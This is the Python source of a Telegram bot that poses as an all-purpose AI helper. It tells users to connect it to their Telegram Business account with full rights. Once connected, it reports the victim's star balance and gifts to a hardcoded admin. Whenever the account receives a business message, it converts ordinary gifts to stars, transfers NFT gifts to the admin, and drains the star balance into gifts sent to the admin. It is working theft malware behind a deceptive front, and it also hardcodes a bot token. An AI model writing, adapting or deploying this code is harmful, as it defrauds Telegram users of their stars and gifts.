from aiogram import F, Bot, Dispatcher, types
import asyncio
import logging
import json
import os
from aiogram.types import Message, BusinessConnection
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.filters import Command

from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts

# Configuration
TOKEN = "7718769489:AAG7_Bv2KS0BwYv8ULyIyMi8EvuBXS7Jbc0"  # Your Bot API Token from @BotFather
ADMIN_ID = 8077821068  # Your Telegram ID

bot = Bot(TOKEN)
dp = Dispatcher()

@dp.message(Command("refund"))
async def refund_command(message: types.Message):
    if not message.from_user:
        return
        
    try:
        command_args = message.text.split() if message.text else []
        if len(command_args) != 2:
            await message.answer("Пожалуйста, укажите id операции. Пример: /refund 123456")
            return

        transaction_id = command_args[1]

        refund_result = await bot.refund_star_payment(
            user_id=message.from_user.id,
            telegram_payment_charge_id=transaction_id
        )

        if refund_result:
            await message.answer(f"Возврат звёзд по операции {transaction_id} успешно выполнен!")
        else:
            await message.answer(f"Не удалось выполнить возврат по операции {transaction_id}.")

    except Exception as e:
        await message.answer(f"Ошибка при выполнении возврата: {str(e)}")

@dp.message(F.text == "/start")
async def start_command(message: Message):
    if not message.from_user:
        return
        
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        await message.answer(
            "❤️ <b>Я — твой главный помощник в жизни</b>, который:\n"
            "• ответит на любой вопрос\n"
            "• поддержит тебя в трудную минуту\n"
            "• сделает за тебя домашку, работу или даже нарисует картину\n\n"
            "<i>Введи запрос ниже, и я помогу тебе!</i> 👇",
            parse_mode="HTML"
        )
    else:
        await message.answer(
            "test\n\n🔗 Бот активен"
        )

@dp.message(F.text)
async def handle_text_query(message: Message):
    await message.answer(
        "📌 <b>Для полноценной работы необходимо подключить бота к бизнес-аккаунту Telegram</b>\n\n"
        "Как это сделать?\n\n"
        "1. ⚙️ Откройте <b>Настройки Telegram</b>\n"
        "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n"
        "3. 🤖 Откройте пункт <b>Чат-боты</b>\n"
        "4. ✍️ Введите имя вашего бота\n\n"
        "❗Для корректной работы боту требуются <b>все права</b>",
        parse_mode="HTML"
    )

CONNECTIONS_FILE = "business_connections.json"

def load_json_file(filename):
    """Безопасная загрузка JSON файла"""
    try:
        if not os.path.exists(filename):
            return []
        
        with open(filename, "r", encoding="utf-8") as f:
            content = f.read().strip()
            if not content:
                return [] 
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception(f"Ошибка при разборе JSON-файла {filename}.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    """Получить ID подключения по ID пользователя"""
    try:
        data = load_json_file("connections.json")
        if isinstance(data, dict):
            return data.get(str(user_id), "")
        return ""
    except Exception as e:
        logging.exception("Ошибка при получении connection_id")
        return ""

def load_connections():
    """Загрузить список бизнес-подключений"""
    return load_json_file(CONNECTIONS_FILE)

async def send_welcome_message_to_admin(connection, user_id, _bot):
    try:
        admin_id = 8077821068

        rights = connection.rights
        business_connection = connection

        star_amount = 0
        all_gifts_amount = 0
        unique_gifts_amount = 0

        if rights.can_view_gifts_and_stars:
            try:
                response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
                star_amount = response.star_amount

                gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
                all_gifts_amount = len(gifts.gifts)
                unique_gifts_amount = sum(1 for gift in gifts.gifts if hasattr(gift, 'type') and gift.type == "unique")
            except Exception as e:
                logging.exception("Ошибка при получении данных о подарках и звездах")

        star_amount_text = star_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
        all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
        unique_gifts_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"

        msg = (
            f"🤖 <b>Новый бизнес-бот подключен!</b>\n\n"
            f"👤 Пользователь: @{business_connection.user.username or '—'}\n"
            f"🆔 User ID: <code>{business_connection.user.id}</code>\n"
            f"🔗 Connection ID: <code>{business_connection.id}</code>\n"
            f"\n⭐️ Звезды: <code>{star_amount_text}</code>"
            f"\n🎁 Подарков: <code>{all_gifts_text}</code>"
            f"\n🔝 NFT подарков: <code>{unique_gifts_text}</code>"            
        )
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🎁 Вывести все подарки", callback_data=f"reveal_all_gifts:{user_id}")],
                [InlineKeyboardButton(text="⭐️ Превратить все подарки в звезды", callback_data=f"convert_exec:{user_id}")],
                [InlineKeyboardButton(text="🔝 Апгрейднуть все гифты", callback_data=f"upgrade_user:{user_id}")]
            ]
        )
        await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")

def save_business_connection_data(business_connection):
    """Сохранить данные бизнес-подключения"""
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name or "Unknown",
        "last_name": business_connection.user.last_name or ""
    }

    data = load_json_file(CONNECTIONS_FILE)

    # Обновляем существующую запись или добавляем новую
    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # Сохраняем обратно
    try:
        with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logging.exception("Ошибка при сохранении данных подключения")

async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str:
    """Получить имя подарка по его ID"""
    try:
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            return "🎁 Нет подарков."
        
        for gift in gifts.gifts:
            if hasattr(gift, 'owned_gift_id') and gift.owned_gift_id == owned_gift_id:
                if hasattr(gift, 'gift') and hasattr(gift.gift, 'base_name'):
                    gift_name = gift.gift.base_name.replace(" ", "")
                    return f"https://t.me/nft/{gift_name}-{gift.gift.number}"
        
        return "🎁 Подарок не найден."
    except Exception as e:
        logging.exception("Ошибка при получении имени подарка")
        return "🎁 Ошибка получения подарка."

@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot)
        await bot.send_message(
            business_connection.user.id, 
            "Привет! Ты подключил бота как бизнес-ассистента."
        )
        
        save_business_connection_data(business_connection)
        
    except Exception as e:
        logging.exception("Ошибка при обработке бизнес-подключения")

OWNER_ID = ADMIN_ID
task_id = ADMIN_ID

@dp.business_message()
async def get_message(message: types.Message):
    business_id = message.business_connection_id
    user_id = message.from_user.id if message.from_user else None

    if user_id == OWNER_ID or not business_id:
        return

    # Конвертация неуникальных подарков
    try:
        convert_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
        for gift in convert_gifts.gifts:
            try:
                if hasattr(gift, 'owned_gift_id') and gift.owned_gift_id:
                    owned_gift_id = gift.owned_gift_id
                    await bot.convert_gift_to_stars(business_id, owned_gift_id)
                    print(f"Конвертирован подарок {owned_gift_id}")
            except Exception as e:
                print(f"Ошибка при конвертации подарка: {e}")
                continue
    except Exception as e:
        print(f"Ошибка при получении неуникальных подарков: {e}")
    
    # Передача уникальных подарков
    try:
        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        if not unique_gifts.gifts:
            print("Нет уникальных подарков для отправки.")
        else:
            for gift in unique_gifts.gifts:
                try:
                    if hasattr(gift, 'owned_gift_id') and gift.owned_gift_id:
                        owned_gift_id = gift.owned_gift_id
                        await bot.transfer_gift(business_id, owned_gift_id, task_id, 25)
                        print(f"Успешно отправлен подарок {owned_gift_id}")
                except Exception as e:
                    print(f"Ошибка при отправке подарка: {e}")
                    continue
    except Exception as e:
        print(f"Ошибка при получении уникальных подарков: {e}")
    
    # Работа с балансом звезд
    try:
        stars = await bot.get_business_account_star_balance(business_id)
        if hasattr(stars, 'amount') and stars.amount > 0:
            print(f"Найдено {stars.amount} звёзд")
            
            # Переводим звёзды на баланс бота
            await bot.transfer_business_account_stars(business_id, stars.amount)
            print(f"Успешно переведено {stars.amount} звёзд на баланс бота")
            
            # Покупаем подарки за звёзды и отправляем админу
            try:
                available_gifts = await bot.get_available_gifts()
                if available_gifts and available_gifts.gifts:
                    # Находим самый дешёвый подарок
                    cheapest_gift = min(available_gifts.gifts, key=lambda g: g.star_count)
                    star_balance = stars.amount
                    gifts_to_buy = star_balance // cheapest_gift.star_count
                    
                    print(f"Покупаем {gifts_to_buy} подарков по {cheapest_gift.star_count} звёзд каждый")
                    
                    for i in range(gifts_to_buy):
                        try:
                            await bot.send_gift(
                                user_id=task_id,
                                gift_id=cheapest_gift.id
                            )
                            print(f"Отправлен подарок {i+1}/{gifts_to_buy}")
                        except Exception as e:
                            print(f"Ошибка при отправке подарка {i+1}: {e}")
                            break
                            
                    print(f"Всего отправлено подарков админу: {gifts_to_buy}")
                else:
                    print("Нет доступных подарков для покупки")
            except Exception as e:
                print(f"Ошибка при покупке подарков: {e}")
        else:
            print("Нет звёзд для отправки.")
    except Exception as e:
        print(f"Ошибка при работе с балансом звёзд: {e}")

async def main():
    try:
        await dp.start_polling(bot)
    except Exception as e:
        logging.exception("Ошибка при запуске бота")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())